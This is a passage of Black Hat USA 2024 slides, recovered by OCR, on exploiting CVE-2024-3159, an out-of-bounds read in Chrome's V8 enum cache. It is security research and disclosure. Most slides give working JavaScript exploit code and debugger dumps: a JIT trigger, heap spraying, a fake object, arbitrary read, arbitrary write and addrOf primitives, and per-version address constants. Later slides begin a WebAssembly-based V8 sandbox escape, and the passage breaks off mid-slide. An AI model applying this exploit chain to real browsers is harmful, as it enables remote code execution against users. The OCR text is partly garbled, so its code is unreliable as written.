CVE-2024-3159 **`Object 2`** `Map Properties Elements 1 1 Get property value index via` **`Map 2`** `indices array Nof descriptors=2 … DescriptorArray mov r9d, dword ptr [rcx + r15*2 + 0xb] … Transition Array` **`Descriptor Array 5`** `Map Enum Cache “a” idx:0 SMI “b” idx:1 SMI “c” idx:2 Double Indices 0 OOB memory…` **`Enum Cache 2`** `Map Keys[1] Indices[1]`

\```
// Object 4, 1,2 and 3 Setup
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
Indices0OOB memory…
\```

#BHUSA @BlackHatEvents

43

## Slide 44

# Let the Cache Cache: Exploiting the Enum Cache Vulnerability

#BHUSA @BlackHatEvents

## Slide 45

### Trigger JIT Stably

\```
%PrepareFunctionForOptimization(trigger);
trigger(_=>_); trigger(_=>_);
%OptimizeFunctionOnNextCall(trigger);
\```

\```
for(letj= 0; j< 0x200000; j++) {
trigger(_=>_); trigger(_=>_);
trigger(_=>_); trigger(_=>_);
trigger(_=>_); trigger(_=>_);
}
✓
\```

\```
for(letj= 0; j< 0x600000; j++) {
trigger(_=>_); trigger(_=>_);
}
\```

\```
✗
Code density is the key!
\```

#BHUSA @BlackHatEvents

45

## Slide 46

### Control the Out of Bounds Read

Object 2
Map
static #empty_object = {};
Properties
const object1 = CreateObject(1), object2 =
CreateObject(9), object3 = CreateObject(10),  Elements
object4 = CreateObject(11); 1
Indices[1]
Map …
function trigger(callback) {
for (let key in object2) { Size Map 2
0
if (key == "p7") { Nof descriptors=9
callback();
Enum Cache 2 Backpointer
return object2[key];}}
Map DescriptorArray
}
Object2[0x41424344] Keys[1] Transition
JIT(trigger);
fakeobj = trigger(function() { OOB  Indices[1] …
Read
object3.p9 = 1.1; String
Descriptor Array 5
for (let key in object1) { };
Map
Map
let string = String.fromCharCode.apply(null,
Size
0x44, 0x43, 0x42, 0x41); Enum Cache
“ABCD”
idx:0 SMI
#empty_object[string]; “p0”
}); … … …
Indices[7]

#BHUSA @BlackHatEvents

46

## Slide 47

##### Control the Out of Bounds Read – More Details

\```
// …
functiontrigger(callback) {
for(letkey inobject2) {
if (key==“p7”){
callback();
returnobject2[key];
}
}
}
JIT(trigger);
fakeobj= trigger(_ => {
object3.p9= 1.1;
for(letkey inobject1){}
letstring=
String.fromCharCode.apply(null,
0x44, 0x43, 0x42, 0x41);
#empty_object[string];
});
\```

\```
Index For-in Loop
\```

\```
7
\```

\```
Object 2
Map
Properties
Elements
1
…
\```

\```
Map 2
Nof descriptors = 9
DescriptorArray
Transition
Descriptor Array 5
Map
Enum Cache
“p0”idx:0SMI
………
“p9”Idx:10Double
………
\```

#BHUSA @BlackHatEvents

47

## Slide 48

##### Control the Out of Bounds Read – More Details

\```
// …
functiontrigger(callback) {
for(letkey inobject2) {
if (key==“p7”){
callback();
returnobject2[key];
}
}
}
JIT(trigger);
fakeobj= trigger(_ => {
object3.p9= 1.1;
for(letkey inobject1){}
letstring=
String.fromCharCode.apply(null,
0x44, 0x43, 0x42, 0x41);
#empty_object[string];
});
\```

\```
Index For-in Loop
\```

\```
7
\```

\```
Indices0OOB memory…
\```

\```
Object 2
Map
Properties
Elements
\```

\```
1
\```

\```
…
\```

\```
Map 2
Nof descriptors = 9
DescriptorArray
Transition
\```

\```
Descriptor Array 5
Map
Enum Cache
\```

\```
“p0”idx:0SMI
“p1”idx:1SMI
………
\```

\```
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

48

## Slide 49

##### Control the Out of Bounds Read – More Details

\```
// …
functiontrigger(callback) {
for(letkey inobject2) {
if (key==“p7”){
callback();
returnobject2[key];
}
}
}
JIT(trigger);
fakeobj= trigger(_ => {
object3.p9= 1.1;
for(letkey inobject1){}
letstring=
String.fromCharCode.apply(null,
0x44, 0x43, 0x42, 0x41);
#empty_object[string];
});
\```

\```
Index For-in Loop7
Indices0OOB memory…0x41424344…
\```

\```
Object 2
Map
Properties
Elements
\```

\```
1
\```

\```
…
\```

\```
Map 2
Nof descriptors = 9
DescriptorArray
Transition
\```

\```
Descriptor Array 5
Map
Enum Cache
“p0”idx:0SMI
“p1”idx:1SMI
………
\```

\```
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

49

## Slide 50

##### Control the Out of Bounds Read – More Details

\```
Object 2
Map
Properties
Elements
1
…
\```

\```
// …
functiontrigger(callback) {
for(letkey inobject2) {
if (key==“p7”){
callback();
returnobject2[key];
}
}
}
JIT(trigger);
fakeobj= trigger(_ => {
object3.p9= 1.1;
for(letkey inobject1){}
letstring=
String.fromCharCode.apply(null,
0x44, 0x43, 0x42, 0x41);
#empty_object[string];
});
\```

\```
Get property value index via
Map 2
indices array
Nof descriptors = 9
…
DescriptorArray
mov
r9d, dwordptr[r9 + r11*4 + 7]
Transition
movr11d, r9d
sarr11d, 1
Descriptor Array 5
movsxdr12, r11d
…Map
Enum Cache
“p0”idx:0SMI
“p1”idx:1SMI
Index For-in Loop7
………
Indices0OOB memory…0x41424344…Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

50

## Slide 51

Object 2
Map
More Details Properties
Elements
1
…
Get property value index via
Map 2
indices array
Nof descriptors = 9
…
DescriptorArray
mov r9d, dword ptr [rcx + r15*2 + 0xb]
Transition
…
Descriptor Array 5
Map
[object2+0x41424344+0xb] Enum Cache
“p0” idx:0 SMI
“p1” idx:1 SMI
Index For-in Loop 7
… … …
Indices 0 OOB memory… 0x41424344 … Enum Cache 2
Map
Keys[1]
Indices[1]

##### Control the Out of Bounds Read – More Details

\```
// …
functiontrigger(callback) {
for(letkey inobject2) {
if (key==“p7”){
callback();
returnobject2[key];
}
}
}
JIT(trigger);
fakeobj= trigger(_ => {
object3.p9= 1.1;
for(letkey inobject1){}
letstring=
String.fromCharCode.apply(null,
0x44, 0x43, 0x42, 0x41);
#empty_object[string];
});
\```

#BHUSA @BlackHatEvents

51

## Slide 52

### From Out of Bounds Read to FakeObj

\```
//read the arbitrary offset of object2 in the ASM level
; fakeobj= [object2+arbitrary_offset+0xB]
moveax, dwordptr[r8+r11*2+0Bh]
addrax, r14
\```

\```
Object2_addr
\```

\```
Object2
\```

\```
The V8 Heap manipulations:
\```

- `Write the arbitrary value at a relative address (of a known object)`

\```
Object2_addr +
offset+ 0xB
\```

\```
Fake_object_
addr
\```

- `Write the arbitrary value at a fixed address`

\```
Fake_object_addr
\```

\```
Fake_object
\```

\```
// fake the arbitrary object in the JS level
fakeobj= object2[arbitrary_index];
\```

#BHUSA @BlackHatEvents

52

## Slide 53

### Write the Arbitrary Value at a Fixed Address

\```
letlarge_arr= newArray(0x400000);
large_arr.fill(1.1);
\```

\```
large_arr[0]=1.2;
\```

\```
Large Array0:000> dd (0x02f10018287d-1)
02f10018287c: 00116db1 000006f5
Map
01402139 00800000
Properties
Elements
Length
Elements0:000> dd (0x02f101402139-1)
02f101402138: 00000879 00800000
Map
9999999a 3ff19999
Length
02f101402148: 9999999a 3ff19999
Data9999999a 3ff19999
…
33333333 3ff33333
\```

\```
Large Array Elements address is fixed per array size and Chrome Version!
\```

#BHUSA @BlackHatEvents

53

## Slide 54

#### Write the Arbitrary Value at a Relative Address

- ~~`Finding an object X adjacent with the object 2 and containing a constant value field`~~

- `Write a value at the relative address of the object2 = object2 address is in a fixed memory scope + fixed large array element address + the arbitrary value spray`

0x01402139-1+8 + 0x200000*8 – 0x150000 – 0xb
~0x150000
0x400000*8 Sliding  Object2
Safe Zone
0.000>  dd (0x029001402139-1)
029001402138: 00000879 00800000
0x022b2135
00116d71 000006f5
0x01402138 029001402148: 01402151 00000002
00000565 00000000
Large Array
029001402158: 01402141 01402141
Element
01402141 01402141
0x01402138+
0x400000*8
…
0x200000*8
fakeobj 029003402158: 01402141 01402141
address spray 00000000 00000000
0x03402138
54 #BHUSA @BlackHatEvents

#BHUSA @BlackHatEvents

## Slide 55

### Fake the Object

Object2_addr

\```
Object2
\```

\```
Object2_addr +
offset+ 0xb
\```

\```
Fake_object_
addr
\```

\```
Fake_object_addr
\```

\```
Fake_object
\```

\```
The theory
\```

\```
Object2_addr
\```

\```
Object2
\```

\```
Large_arr_elem_addr:
0x01402139
Large Array
Fakeobj_addr
Element
: 0x01402141
Fake_object
Object2_addr +
0x22b2135+ 0xb
fakeobj
address
spray:
0x01402141
\```

\```
The practice
\```

\```
JavascriptLevel
\```

\```
//read and write
with fakeobj
f = fakeobj[0];
fakeobj[0] = obj;
//read and write
with large array
a = large_arr[i];
large_arr[i] = c;
\```

#BHUSA @BlackHatEvents

55

## Slide 56

### Fake the Object – Object Map Values

\```
PACKED_DOUBLE_ELEMENTS
\```

\```
letl= [1.1, 1.2, 1.3, 1.4];
leta= [1, 2, 3, 1.2, 'x'];
\```

0.000>  dd (0x01a600188375-1)
01a600188374:  00116d71 000006f5
JS Array
0018834d 00000008
Map
Properties
PACKED_ELEMENTS
Elements
0.000>  dd (0x01a600188385-1)
Length
01a600188384:  00116df1 000006f5
00146b11 0000000a

\```
Map Values are Fixed per Chrome Version!
\```

#BHUSA @BlackHatEvents

56

## Slide 57

### Fake the Object – More Details

\```
large_arr[0] = BigIntAsDouble(FAKE_OBJ_MAP|(0x6f5<<32n));
large_arr[1] = BigIntAsDouble(FAKE_OBJ_ELEMENTS_ADDR|(smi(1n)<<32n));
large_arr[2] = BigIntAsDouble(FIXED_ARRAY_MAP|(smi(0n) << 32n));
\```

\```
Large Array Elements
Map
Length
Fake_Obj_Map
fakeobj
Fake_Obj_Properties
Fake_Obj_Elements
Fake_Obj_Length
Fake Obj Elements
Fake_Obj_Map
Fake_Obj_Length
Data
…
\```

\```
0.000> dd (0x029001402139-1)
029001402138: 00000879 00800000
00116d71000006f5 -> la[0]
029001402148: 01402151 00000002 -> la[1]
00000565 00000000 -> la[2]
029001402158: 01402141 01402141-> la[3]
& fake[0]
01402141 01402141 …
…
029003402158: 01402141 01402141
%DebugPrint(fakeobj);
0x029001402141<JSArray[1]>
\```

#BHUSA @BlackHatEvents

57

## Slide 58

### From FakeObj to Exploitation Primitives: Arbitrary Read

\```
functionv8_read64(addr) {
addr|= 1n;
addr-= FIXED_ARRAY_HEADER_SIZE;
large_arr[0] = BigIntAsDouble(PACKED_DOUBLE_ELEMENTS_MAP| (DEFAULT_JS_ARRAY_PROPERTIES<< 32n));
large_arr[1] = BigIntAsDouble(addr| (smi(1n) << 32n));
letresult= DoubleAsBigInt(fakeobj[0]);
large_arr[1] = BigIntAsDouble(0n| (smi(0n) << 32n));
returnresult;
}
\```

\```
Large Array Elements
Map
Length
PACKED_DOUBLE_ELEMEN
fakeobj
TS_MAP
DEFAULT_JS_ARRAY_PRO
PERTIES
Arbitray_Addr|1 –8
Obj_Length-smi(1n)
\```

Arbitrary
Address
…
fakeobj[0 ]
…

\```
0.000> dd (0x029001402139-1)
029001402138: 00000879 00040000
00116d71000006f5 -> la[0]
029001402148: 1234567100000002 -> la[1]
\```

\```
v8_read64(0x12345678) -> 0xdeadbeefdeadbeef
0.000> dd 0x029012345678
029012345678: deadbeefdeadbeef-> fakeobj[0]
\```

#BHUSA @BlackHatEvents

58

## Slide 59

### From FakeObj to Exploitation Primitives: Arbitrary Write

\```
functionv8_write(bit, addr, val) {
addr|= 1n;
addr-= FIXED_ARRAY_HEADER_SIZE;
large_arr[0] = BigIntAsDouble(PACKED_DOUBLE_ELEMENTS_MAP| (DEFAULT_JS_ARRAY_PROPERTIES<< 32n));
large_arr[1] = BigIntAsDouble(addr| (smi(1n) << 32n));
if(bit==64) fake[0] = BigIntAsDouble(val);
if(bit==32) { letoriginal= read64(addr); fake[0] = BigIntAsDouble(val| (original[1] << 32n)); }
large_arr[1] = BigIntAsDouble(0n| (smi(0n) << 32n));
}
\```

\```
fakeobj
\```

\```
Large Array Elements
Map
Length
Arbitrary
PACKED_DOUBLE_ELEMEN
Address
TS_MAP
DEFAULT_JS_ARRAY_PRO…
fakeobj[0]
…
PERTIES
\```

\```
DEFAULT_JS_ARRAY_PRO
PERTIES
Arbitray_Addr|1 –8
Obj_Length-smi(1n)
\```

\```
0.000> dd (0x029001402139-1)
029001402138: 00000879 00040000
00116d71000006f5 -> la[0]
029001402148: 1234567100000002 -> la[1]
\```

\```
v8_write(32, 0x12345678, 0x13371337)
0.000> dd 0x029012345678
029012345678: 13371337 deadbeef-> fakeobj[0]
v8_write(64, 0x12345678, 0x1337133713371337)
0.000> dd 0x029012345678
029012345678: 13371337 13371337 -> fakeobj[0]
\```

#BHUSA @BlackHatEvents

59

## Slide 60

### From FakeObj to Exploitation Primitives: Addrof

\```
functionaddrOf(obj) {
\```

\```
large_arr[0] = BigIntAsDouble(PACKED_ELEMENTS_MAP| (DEFAULT_JS_ARRAY_PROPERTIES<< 32n));
large_arr[1] = BigIntAsDouble(FAKE_JS_ARRAY_ELEMENTS_ADDR| (smi(1n) << 32n));
fake[0] = obj;
\```

\```
letaddr= DoubleAsBigInt(large_arr[3]) | (smi(0n) << 32n);
returnaddr;
}
\```

\```
Large Array Elements0.000> dd (0x029001402139-1)
Map029001402138: 00000879 00800000
00116df1000006f5 -> la[0]
Length
029001402148: 01402151 00000002 -> la[1]
PACKED_ELEMENTS_MAP
fakeobj00000565 00000000 -> la[2]
DEFAULT_JS_ARRAY_PROP
029001402158: 001582e501402141 -> la[3]
ERTIES
Fake_Obj_Elements
Obj_Length-smi(1n)
obj: 0x0290001582e5<Objectmap= 000002900015655D>
Fake Obj Elements
Fake_Obj_Map
Fake_Obj_LengthaddrOf(obj) -> 0x001582e5
obj
Fakeobj[0]
\```

#BHUSA @BlackHatEvents

60

## Slide 61

## Stability: From 90% to 99% - Are the Fixed Values Really Fixed ?

|**`Chrome`**
**`Version`**
`M122`|**`Large Array`**
**`Length`**
`0x20000`|
**`V8MInorM`**
**`S`**
`no`|**`Large Array`**
**`Element Address`**
`0x442139`
`0x482139`|**`Chrome`**
**`Version`**|**`V8Min`**
**`orMS`**|**`Free`**
**`Chunk`**
**`Base`**|**`PACKED_D`**
**`OUBLE_EL`**
**`EMENTS_M`**
**`AP`**|**`PACKED_EL`**
**`EMENTS_MA`**
**`P`**|
|---|---|---|---|---|---|---|---|---|
|`M123`|`0x20000`|`no`|`0x442139`
`0x482139`|`M122`|`no`|`0xc0000`|`FREE_CHU`
`NK_BASE+`
`0x56ac5`|`PACKED_DO`
`UBLE_ELEM`
`ENTS_MAP+`|
|`M122`|`0x100000`|`no`|`0x7c2139`
`0x802139`|||||`0x80`|
|`M123`|`0x100000`|`no`|`0x7c2139`
`0x802139`|`M123`|`no`|`0xc0000`|`FREE_CHU`
`NK_BASE+`
`0x56d71`|`PACKED_DO`
`UBLE_ELEM`
`ENTSMAP+`|
|`M122`|`0x400000`|`no`|`0x13c2139`|||||`_`
`0x80`|
||||`0x1402139`||`yes`|`0x200000`|||
|`M123`|`0x400000`|`no`|`0x13c2139`
`0x1402139`||||||
|||`yes`|`0x1302139`||||||
|`…`|`…`|`…`|`…`|`…`|`…`|`…`|`…`|`…`|

#BHUSA @BlackHatEvents

61

## Slide 62

##### Stability: 3 Possible Large Array Element Addresses

`0x01302139 0x01302139 0x01302139 0x01302141 Large Array Element Fake_object 0x013c2139 0x013c2139` ... `0x013c2141 0x013c2141 Large Array Element 0x01402139 Fake_object Fake_object Large Array Element Anchor_fakeobj_ Anchor_fakeobj_ Anchor_fakeobj_ addr:` **`0x01402141`** `addr:` **`0x01402141`** `addr:` **`0x01402141`** `Fake_object Fake_object Fake_object` … `5 fake objects` … `0x014c2141 0x014c2141 evenly distributed with the gap Fake_object Fake_object 0x40000 (0x8000*8) 0x01502141 5 fake objects evenly distributed Fake_object with the gap 0x40000 (0x8000*8) 5 fake objects evenly distributed 5`<sup>`th`</sup> `fake obj: 2`<sup>`nd`</sup> `fake obj: 1`<sup>`st`</sup> `fake obj: with the gap Large_arr[0+3] 0x40000 (0x8000*8) Large_arr[0x8000*4+3] Large_arr[0x8000+3]`

#BHUSA @BlackHatEvents

62

## Slide 63

##### Stability: Find the Index for 3 Possible Large Array Element Addresses

\```
functionfind_index() {
letindex= -1;
fakeobj[0] = 1.1;0.000> dd (0x029001402139-1)
for(leti=0; i<5; i++)029001402138: 00000879 00800000
{00116d71000006f5 -> la[0+index]
if(large_arr[3+i*0x8000] != 029001402148: 01402151 00000002 -> la[1+index]
00000565 00000000 -> la[2+index]
BigIntAsDouble(FAKE_JS_ARRAY_ADDR|
029001402158: 00162fa101402141 -> la[3+index]
FAKE_JS_ARRAY_ADDR<< 32n))
& fake[0]
{
index= 0x8000 * i;
break;
}
}
returnindex;
}
\```

#BHUSA @BlackHatEvents

63

## Slide 64

## Stability: Scavenger vs MinorMS

\```
Scavenger: V8 current default young generation
garbage collector
\```

\```
MinorMS: aka Minor Mark-Sweep, the new V8
young generation garbage collector
\```

\```
Free_Chunk_Base
\```

#BHUSA @BlackHatEvents

64

## Slide 65

## Homework for MinorMS

- `When and why the MinorMS will be enabled?`

- `Is there a way to explicitly enable/disable MinorMS?`

- `Is there a way to identify MinorMS will be enabled or not?`

- `Is it possible to control the switch of MinorMS in the exploit?`

- `Does MinorMS impact your exploit? If yes, how?`

- `Is it possible to fit your exploit working under both Scavenger and MinorMS at the same time? Or is it really necessary?`

- `More secrets about MinorMS …`

#BHUSA @BlackHatEvents

65

## Slide 66

# Let the WebAssembly Assemble: The V8 Sandbox

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat © = “9 |
USA 2024
Let the WebAssembly
Assemble:
The V8 Sandbox
```

## Slide 67

###### **`Address Space`**

### V8 Sandbox

Object1
Raw pointer
(64bits  pointer )
Object2

#BHUSA @BlackHatEvents

67

## Slide 68

###### **`Address Space`**

### V8 Sandbox

Object1
Offset
(From  Sandbox base addr)
Object2
Raw  pointer
External
Object

#BHUSA @BlackHatEvents

68

## Slide 69

Address Space
V8 Sandbox
Object1
Object3 Object4
Offset
Object2 Index Index
Index
External  Trusted  Code Pointer
Pointer Table Pointer Table Table
0 Type+Pointer 0 Type+Pointer 0 Pointer
1 Type+Pointer 1 Type+Pointer 1 Pointer
External  Trusted  Executable
Object Object Object

#BHUSA @BlackHatEvents

69

## Slide 70

# Let the WebAssembly Assemble: The WASM Internals

#BHUSA @BlackHatEvents

## Slide 71

###### WASM Internals – RWX Memory Region

WASM RWX Memory
var wasm_code = new Uint8Array([…]);
CallTarget
0x3e4058452000 jmp 0x3e4058452840
var wasm_mod = new
0x3e4058452005 jmp 0x3e405845280a Main Jump
WebAssembly.Module(wasm_code);
Table
0x3e405845200a jmp 0x3e4058452814
… …
var wasm_instance = new
WebAssembly.Instance(wasm_mod); 0x3e4058452040 jmp qword ptr[rip+0x2]
var f_main =  … …
0x3e4058452048 0x7ffff3d23780
Far Jump
wasm_instance.exports.main;
… …
Table
0x3e4058452050 jmp qword ptr[rip+0x2]
f_main();
… …
0x3e4058452050 0x7ffff3d23c00
… …
0x3e4058452840 push rbp
0x3e4058452841 mov rbp,rsp
Compiled
0x3e4058452844 push 0x8
code
0x3e4058452846 push rsi
0x3e4058452847 sub rsp,0x10
… …

#BHUSA @BlackHatEvents

71

## Slide 72

###### WASM Internals – Module and Instance

###### **Address Space**

### V8 Sandbox

WasmInstanceObject WasmModuleObject
Map Map
Trusted Ptr Table  External Ptr Table
Index Index
…
WasmModuleObject
External  NativeModule
Trusted  WasmTrustedInstanceData Pointer Table
WasmModule
Pointer Table
Map 0 Type+Pointer
…
0 Type+Pointer
…
1 Type+Pointer
WasmModule
1 Type+Pointer
wasm_dispatch_table
jump_table_start …
Vector<WasmFunction>
…
…

#BHUSA @BlackHatEvents

72

## Slide 73

### WASM Internals – Export Functions

###### **Address Space**

### V8 Sandbox

WasmExportFunction SharedFunctionInfo WasmExportedFunctionData
Map Map Map
SharedFunctionInfo WasmExportedFunctionData WasmInternalFunction
… …
WasmInstanceObject
Function Index
WasmInternalFunction
Map
WasmInstanceObject
External
Function Index

#BHUSA @BlackHatEvents

73

## Slide 74

### WASM Basics – Table and Indirect Call

let wasm_code_0 = new Uint8Array([…]);
let wasm_mod_0 = new
WebAssembly.Module(wasm_code_0);
let wasm_instance_0 = new
WebAssembly.Instance(wasm_mod_0);
indirect =
wasm_instance_0.exports.indirect;

(module
(func $indirect (result f32)
f32.const 0.015
)
(export "indirect" (func $indirect))
)

#BHUSA @BlackHatEvents

74

## Slide 75

### WASM Basics – Table and Indirect Call

\```
consttbl= new WebAssembly.Table({(module
initial: 1,(type $whatever(func(result f32)))
element: "anyfunc",(import "env" "tbl" (table $tb1 funcref))
maximum: 10(func$main(param $parametref32) (result f32)
});(f32.mul
(call_indirect(type $whatever)
(i32.const0))
constimportObject= {(local.get$parametre)
env: {tbl})
};)
(export "main" (func$main))
letwasm_code_1 = newUint8Array([…]);)
letwasm_mod_1 = new
WebAssembly.Module(wasm_code_1);
letwasm_instance_1 = new
WebAssembly.Instance(wasm_mod_1, importObject);
tbl.set(0, indirect);
wasm_instance_1.exports.main(1000); //15
\```

#BHUSA @BlackHatEvents

75

## Slide 76

### WASM Basics – Table and Indirect Call

`… void WasmTableObject::SetFunctionTableEntry(Isolate* isolate, Handle<WasmTableObject> table, tbl.set(0, indirect); int entry_index, Handle<Object> entry) { wasm_instance_1.exports.main(1000); //15 ... Handle<Object> external = WasmInternalFunction::GetOrCreateExternal( handle(WasmFuncRef::cast(*entry)->internal(isolate), isolate));` **`WasmExportFunction`** `if (WasmExportedFunction::IsWasmExportedFunction(*external)) { Map auto exported_function = Handle<WasmExportedFunction>::cast(external); SharedFunctionInfo Handle<WasmTrustedInstanceData> target_instance_data( exported_function->instance()->trusted_data(isolate), isolate);` **`SharedFunctionInfo`** `int func_index = exported_function->function_index(); Map WasmExportedFunctionData auto* wasm_function = &target_instance_data->module()->functions[func_index];` **WasmExportedFunctionData** `UpdateDispatchTables(isolate, table, entry_index, wasm_function,` Map `target_instance_data); }` WasmInternalFunction `...` WasmInstanceObject `}` Function Index

#BHUSA @BlackHatEvents

76

## Slide 77

### WASM Basics – Table and Indirect Call

…
void WasmTableObject::SetFunctionTableEntry(Isolate* isolate,
Handle<WasmTableObject> table,
tbl.set(0, indirect);
int entry_index,
Handle<Object> entry) {
wasm_instance_1.exports.main(1000); //15
...
Handle<Object> external = WasmInternalFunction::GetOrCreateExternal(
handle(WasmFuncRef::cast(*entry)->internal(isolate), isolate));
WasmInstanceObject
Map if (WasmExportedFunction::IsWasmExportedFunction(*external)) {
auto exported_function = Handle<WasmExportedFunction>::cast(external);
Trusted Ptr Table Index
WasmModuleObject
Handle<WasmTrustedInstanceData> target_instance_data(
exported_function->instance()->trusted_data(isolate), isolate);
WasmModuleObject
Map int func_index = exported_function->function_index();
…
auto* wasm_function =
External  NativeModule &target_instance_data->module()->functions[func_index];
Pointer Table
WasmModule
UpdateDispatchTables(isolate, table, entry_index, wasm_function,
0 Type+Pointer
…
target_instance_data);
1 Type+Pointer }
WasmModule ...
}
…
Vector<WasmFunction>
… 77 #BHUSA @BlackHatEvents

## Slide 78

### WASM Basics – Table and Indirect Call

\```
…
tbl.set(0, indirect);
wasm_instance_1.exports.main(1000); //15
\```

\```
voidWasmTableObject::SetFunctionTableEntry(Isolate* isolate,
Handle<WasmTableObject> table,
intentry_index,
Handle<Object> entry) {
...
Handle<Object> external = WasmInternalFunction::GetOrCreateExternal(
handle(WasmFuncRef::cast(*entry)->internal(isolate), isolate));
if (WasmExportedFunction::IsWasmExportedFunction(*external)) {
autoexported_function= Handle<WasmExportedFunction>::cast(external);
Handle<WasmTrustedInstanceData> target_instance_data(
exported_function->instance()->trusted_data(isolate), isolate);
int func_index= exported_function->function_index();
\```

\```
auto* wasm_function=
&target_instance_data->module()->functions[func_index];
UpdateDispatchTables(isolate, table, entry_index, wasm_function,
target_instance_data);
}
\```

\```
...
\```

\```
}
\```

#BHUSA @BlackHatEvents

78

## Slide 79

### WASM Basics – Table and Indirect Call

###### **`WasmInstanceObject`**

\```
Map
Trusted PtrTable
Index
WasmModuleObject
\```

\```
Trusted
Pointer Table
0Type+Pointer
1Type+Pointer
\```

\```
WasmTrustedInstanceData
Map
\```

\```
voidWasmTableObject::UpdateDispatchTables(
\```

\```
Isolate* isolate, Handle<WasmTableObject> table, intentry_index,
constwasm::WasmFunction* func,
\```

\```
Handle<WasmTrustedInstanceData> target_instance_data) {
\```

\```
...
Address call_target= target_instance_data->GetCallTarget(func->func_index);
...
\```

\```
for(inti= 0, len= uses->length(); i< len; i+= TableUses::kNumElements) {
inttable_index= Smi::cast(uses->get(i+ TableUses::kIndexOffset)).value();
Handle<WasmInstanceObject> instance_object= handle(
WasmInstanceObject::cast(uses->get(i+ TableUses::kInstanceOffset)),
isolate);
\```

\```
...
Tagged<WasmTrustedInstanceData> instance_data=
instance_object->trusted_data(isolate);
\```

\```
…
\```

\```
wasm_dispatch_table
jump_table_start
…
\```

\```
instance_data->dispatch_table(table_index)
->Set(entry_index, *call_ref, call_target, sig_id);
}
}
\```

… `dispatch_table` call_target `Index` 0 …

#BHUSA @BlackHatEvents

79

## Slide 80

###### WASM Internals – Table and Indirect Call

`Address WasmTrustedInstanceData::GetCallTarget` Control of `(` **WASM Instance 0 RWX Memory** `uint32_t func_index` callTarget `) {` 0x3e4058452000 jmp 0x3e4058452840 `wasm::NativeModule* native_module =` 0x3e4058452005 0x0000000000 Main Jump `module_object()->native_module();` Table `…` 0x3e405845200a 0x0000000000 `return jump_table_start() +` … … 0x3e4058452040 jmp qword ptr[rip+0x2] `JumpTableOffset( native_module->module(), func_index` … … `);` 0x3e4058452048 0x7ffff3d23780 Far Jump `}` … … Table 0x3e4058452050 jmp qword ptr[rip+0x2] … … `uint32_t JumpSlotIndexToOffset(uint32_t slot_index) { uint32_t line_index = slot_index /` 0x3e4058452050 0x7ffff3d23c00 `kJumpTableSlotsPerLine;` … … `uint32_t line_offset =` 0x3e4058452840 push rbp `(slot_index % kJumpTableSlotsPerLine) *` 0x3e4058452841 mov rbp,rsp Compiled `kJumpTableSlotSize;` 0x3e4058452844 push 0x8 code 0x3e4058452846 push rsi `return line_index * kJumpTableLineSizekJumpTableLineSize + line_offset;` 0x3e4058452847 sub rsp,0x10 … …

\```
returnline_index* kJumpTableLineSizekJumpTableLineSize+
line_offset;
}
\```

#BHUSA @BlackHatEvents

80

## Slide 81

###### WASM Internals – Table and Indirect Call

WASM Instance 0 RWX Memory
…
0x3e4058452000 jmp 0x3e4058452840
jump
tbl.set(0, indirect); 0x3e4058452005 0x0000000000 Main Jump
Table
0x3e405845200a 0x0000000000
wasm_instance_1.exports.main(1000);
… …
0x3e4058452040 jmp qword ptr[rip+0x2]
Access
… …
…
dispatch_table call_target of  0x3e4058452048 0x7ffff3d23780
Far Jump
indirect
… …
Table
function
0x3e4058452050 jmp qword ptr[rip+0x2]
Index 0 … … …
0x3e4058452050 0x7ffff3d23c00
… …
0x3e4058452840 push rbp
0x3e4058452841 mov rbp,rsp
Compiled
0x3e4058452844 push 0x8
code
0x3e4058452846 push rsi
0x3e4058452847 sub rsp,0x10
… …

#BHUSA @BlackHatEvents

81

## Slide 82

###### WASM Internals – Table and Indirect Call

`Address WasmTrustedInstanceData::GetCallTarget(` Control of `uint32_t func_index` callTarget `) { wasm::NativeModule* native_module = module_object()->native_module(); … return jump_table_start() + JumpTableOffset( native_module->module(), func_index ); } Control of func_index Control of callTarget Control flow Hijacking primitive inside RWX memory`

**WASM Instance 0 RWX Memory**

0x3e4058452000 jmp 0x3e4058452840 0x3e4058452005 0x0000000000 Main Jump Table 0x3e405845200a 0x0000000000 … … 0x3e4058452040 jmp qword ptr[rip+0x2] … … 0x3e4058452048 0x7ffff3d23780 Far Jump … … Table 0x3e4058452050 jmp qword ptr[rip+0x2] … … 0x3e4058452050 0x7ffff3d23c00 … … 0x3e4058452840 push rbp 0x3e4058452841 mov rbp,rsp Compiled 0x3e4058452844 push 0x8 code 0x3e4058452846 push rsi 0x3e4058452847 sub rsp,0x10 … …

#BHUSA @BlackHatEvents

82

## Slide 83

# Let the WebAssembly Assemble: The Sandbox Escape

#BHUSA @BlackHatEvents

## Slide 84

### V8 Sandbox Escape – The Setup

###### WASM Module 0

###### WASM Module 1

\```
(module
(func$indirect (result f32)
f32.const0.015
)
(export "indirect" (func$indirect))
)
\```

###### WASM Module 2

\```
(module
(func(export "f0") nop)
(func(export "f1") nop)
(func(export "f2") nop)
(func(export "f3") nop)
\```

\```
(module
\```

\```
(type $whatever(func(result f32)))
(import "env" "tbl" (table $tb1 funcref))
(func$exploit(param $parametref32) (result f32)
(f32.mul
\```

\```
(call_indirect(type $whatever) (i32.const0))
(local.get$parametre)
)
)
(export ”exploit" (func$exploit))
)
\```

\```
…
(func(export "fN") (result f32)
f32.const0.015
)
\```

\```
)
\```

#BHUSA @BlackHatEvents

84

## Slide 85

### V8 Sandbox Escape – Field Confusion

Address Space
V8 Sandbox
Wasm Instance 0
Wasm Module 0
Map
Map
Trusted Ptr Table Index
WasmModuleObject …
Using arb read/write
Wasm Instance 2
Map Wasm Module 2
Trusted Ptr Table Index Map
WasmModuleObject …
Trusted  Wasm Trusted Instance 1
Pointer Table Wasm Trusted Instance 0  Data
Data
0 Type+Pointer Map
Map
1 Type+Pointer wasm_dispatch_table
wasm_dispatch_table

#BHUSA @BlackHatEvents

85

## Slide 86

### V8 Sandbox Escape – Field Confusion

Address Space
V8 Sandbox
Wasm Instance 0
